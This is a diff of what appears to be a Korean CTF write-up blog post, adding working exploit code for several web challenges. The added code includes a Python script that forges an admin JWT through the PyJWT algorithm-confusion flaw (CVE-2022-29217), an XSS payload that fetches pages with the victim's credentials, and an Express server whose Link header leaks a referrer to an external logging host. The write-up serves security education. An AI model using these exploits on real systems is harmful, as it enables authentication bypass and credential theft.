@@ -13,17 +13,17 @@ image: /assets/img/2025_spacewar2/thumbnail.jpg
 ---
 
 ## 목차
-[목차](#목차)
-    - [8\_chances](#8_chances)
-    - [HSpaceCross](#hspacecross)
-    - [ArtGallery](#artgallery)
-    - [One's-blog](#ones-blog)
-    - [Spiderman](#spiderman)
+
+- [목차](#목차)
+- [8\_chances](#8_chances)
+- [HSpaceCross](#hspacecross)
+- [Art Gallery](#art-gallery)
+- [One's-blog](#ones-blog)
+- [Spiderman](#spiderman)
 
 ## 8_chances
 
-- sql injection
-- mariadb
+sql injection, mariadb를 컨셉으로 문제를 제작하였습니다.
 
 주요 기능을 정리해보겠습니다.
 1. `reset` : chance를 8로 초기화합니다.
@@ -149,7 +149,7 @@ Step 5) 플래그 획득 가능 확인
 
 ![image.png](/assets/img/2025_spacewar2/image%203.png)
 
-## ArtGallery
+## Art Gallery
 
 이 문제는 PyJWT 라이브러리의 알고리즘 혼동 취약점(CVE-2022-29217)을 악용하여, 서버의 JWT 서명 검증 로직을 우회하고 인증 권한을 탈취하여 플래그를 획득하는 과정을 다룹니다.
 해당 취약점은 PyJWT 1.5.0 ~ 2.3.0 버전에서 발생하며, `jwt.algorithms.get_default_algorithms()` 호출을 통해 대칭 키와 비대칭 키 알고리즘을 모두 지원하게 되면서 발생합니다.
@@ -160,10 +160,80 @@ data-token을 JWT 디코더로 분석해보면, alg: ES256 (비대칭키, ECDSA)
 PyJWT의 취약점(CVE-2022-29217)을 이용하여, JWT의 Header의 alg 값을 HS256으로 변경하고, 동시에 기존 ES256에서 사용되던 공개키를 HS256의 비밀키처럼 사용하도록 유도합니다. 이를 위해 JWT의 jwk 형식 공개키를 OpenSSH 포맷 또는 PEM 포맷 문자열로 추출합니다.
 이로써 서버가 HS256으로 서명된 토큰을 허용하고, 해당 비밀키로 공개키 문자열을 사용함으로써 서명 검증이 우회됩니다.
 
-JWT의 header는 alg: HS256, typ: JWT로 설정하고, 비밀키는 추출한 공개키 문자열 사용합니다. 서버는 이 위조된 토큰을 신뢰하고 user=admin 권한으로 처리리하게 됩니다. 
+JWT의 header는 alg: HS256, typ: JWT로 설정하고, 비밀키는 추출한 공개키 문자열 사용합니다. 서버는 이 위조된 토큰을 신뢰하고 user=admin 권한으로 처리하게 됩니다. 
 
 마지막으로 data-token에 넣으면 flag가 나타납니다.
-- 사진 간격이 있어서 flag 글씨가 조금 명확하지 않을 수 있는데, F12를 이용해서 화면 크키 조정하면 잘 자입니다.
+- 사진 간격이 있어서 flag 글씨가 조금 명확하지 않을 수 있는데, F12를 이용해서 화면 크키 조정하면 잘 보입니다.
+
+exploit.py
+```py
+import jwt
+import base64
+import json
+import requests
+from bs4 import BeautifulSoup
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives.asymmetric import ec
+from cryptography.hazmat.primitives import serialization
+
+def extract_jwt_header(token):
+    try:
+        header_b64 = token.split(".")[0] + "==="
+        header_json = base64.urlsafe_b64decode(header_b64).decode("utf-8")
+        header = json.loads(header_json)
+        return header
+    except Exception as e:
+        return None
+
+def base64url_to_bytes(val):
+    val += '=' * ((4 - len(val) % 4) % 4)
+    return base64.urlsafe_b64decode(val)
+
+def jwk_ec_to_openssh(jwk):
+    try:
+        if jwk["kty"] != "EC" or jwk["crv"] != "P-256":
+            raise ValueError("Unsupported key type or curve")
+
+        x_bytes = base64url_to_bytes(jwk["x"])
+        y_bytes = base64url_to_bytes(jwk["y"])
+        
+
+        public_numbers = ec.EllipticCurvePublicNumbers(
+            int.from_bytes(x_bytes, byteorder="big"),
+            int.from_bytes(y_bytes, byteorder="big"),
+            ec.SECP256R1()
+        )
+
+        public_key = public_numbers.public_key(default_backend())
+        
+        openssh = public_key.public_bytes(
+            encoding=serialization.Encoding.OpenSSH,
+            format=serialization.PublicFormat.OpenSSH
+        ).decode()
+
+        return openssh
+    except Exception as e:
+        print(f"[!] Error converting JWK to SSH: {e}")
+        return None, None
+
+url = "http://localhost:5000/"
+response = requests.get(url)
+
+if response.status_code == 200:
+    soup = BeautifulSoup(response.text, "html.parser")
+    img = soup.find("img", attrs={"data-token": True})
+    
+    if img:
+        token = img["data-token"]
+        header = extract_jwt_header(token)
+        
+        if header:
+            ssh_key = jwk_ec_to_openssh(header)
+            fake_token = token = jwt.encode({"user": "admin"}, ssh_key, algorithm="HS256")
+            check_token_url = f"http://localhost:5000/check_token?token={fake_token}"
+            check_response = requests.get(check_token_url)
+            print(check_response.text)
+```
 
 ## One's-blog
 
@@ -248,7 +318,7 @@ bot 로직을 확인해보면 `첫번째 유저 방문 -> 다음에 방문할 �
 
 1~5번 과정을 모두 수행하는 악성 게시글 스크립트입니다.
 
-```html
+```javascript
 <form name="bar" id="lmao "><input form="lmao" name="removeAttribute" /></form>
 <img src="X" onerror="fetch('/posts/', { method: 'GET', credentials: 'include'
 }).then(res => res.text()).then(text => { const parser = new DOMParser(); const
@@ -426,6 +496,29 @@ Link: <uri-reference>; param1=value1; param2="value2"
 
 ```
 Link: <WEBHOOK>; rel="preload"; as="image"; referrerpolicy="unsafe-url"
+```
+
+exploit.js
+```js
+const express = require('express');
+const path = require('path');
+
+const app = express();
+const PORT = 3000;
+
+app.get('/', (req, res) => {
+    res.setHeader(
+        'Link',
+        '<https://wuicxxs.request.dreamhack.games/log>; rel="preload"; as="image"; referrerpolicy="unsafe-url"'
+    );
+    res.setHeader(
+        'Cross-Origin-Resource-Policy',
+        'cross-origin'
+    );
+    res.sendFile(path.join(__dirname, 'logo.png'));
+});
+
+app.listen(PORT, () => { });
 ```
 
 이미지에서 response에 Link header를 설정하여 위와 같이 credential을 유출시킬 수 있습니다.
